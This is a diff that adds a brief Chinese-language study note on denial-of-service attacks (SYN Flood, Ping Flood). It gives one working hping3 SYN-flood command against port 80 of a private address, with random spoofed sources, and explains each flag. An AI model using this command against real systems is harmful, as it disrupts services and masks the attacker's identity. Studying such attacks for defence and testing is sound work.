@@ -1,0 +1,10 @@
+1.dos (denial of service ) 使拒绝服务
+	常见的dos攻击：如SYN FLood、Ping Flood
+
+	hping3  -i u1000 -p 80 --rand-source -S 192.168.0.1
+		-i interval 指定发包间隔，如 -u1000
+		-a 使用地址伪装 -a 1.1.1.1
+		--rand-source 地址随机
+		-S 使用SYN标记
+		-p 端口
+
